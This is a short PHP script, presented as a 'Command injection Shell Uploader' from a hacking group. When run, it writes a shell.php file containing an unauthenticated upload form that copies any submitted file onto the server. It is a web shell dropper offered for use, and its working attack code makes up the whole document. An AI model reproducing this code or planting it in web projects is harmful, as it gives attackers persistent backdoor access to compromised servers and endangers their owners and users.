<!-- Windows Command injection Shell Uploader Coded By Shehryar From Digital Hacker -->

<?php 
$post_ = "post";
$file = fopen("shell.php","a+"); //File name & Output path
$coma = '""';
$coma1 = '"';
$s = "$";
$php = "<?php echo 'Uploader<br>';echo '<br>';echo '<form action=".$coma." method=".$coma1."post".$coma1." enctype=".$coma1."multipart/form-data".$coma1." name=".$coma1."uploader".$coma1." id=".$coma1."uploader".$coma1.">';echo '<input type=".$coma1."file".$coma1." name=".$coma1."file".$coma1." size=".$coma1."50".$coma1."><input name=".$coma1."_upl".$coma1." type=".$coma1."submit".$coma1." id=".$coma1."_upl".$coma1." value=".$coma1."Upload".$coma1."></form>';if( ".$s."_POST['_upl'] == ".$coma1."Upload".$coma1." ) {if(@copy(".$s."_FILES['file']['tmp_name'], ".$s."_FILES['file']['name'])) { echo '<b>Upload !!!</b><br><br>'; }else { echo '<b>Upload !!!</b><br><br>'; }}?>";
fwrite ($file, $php);
fclose($file);
?>
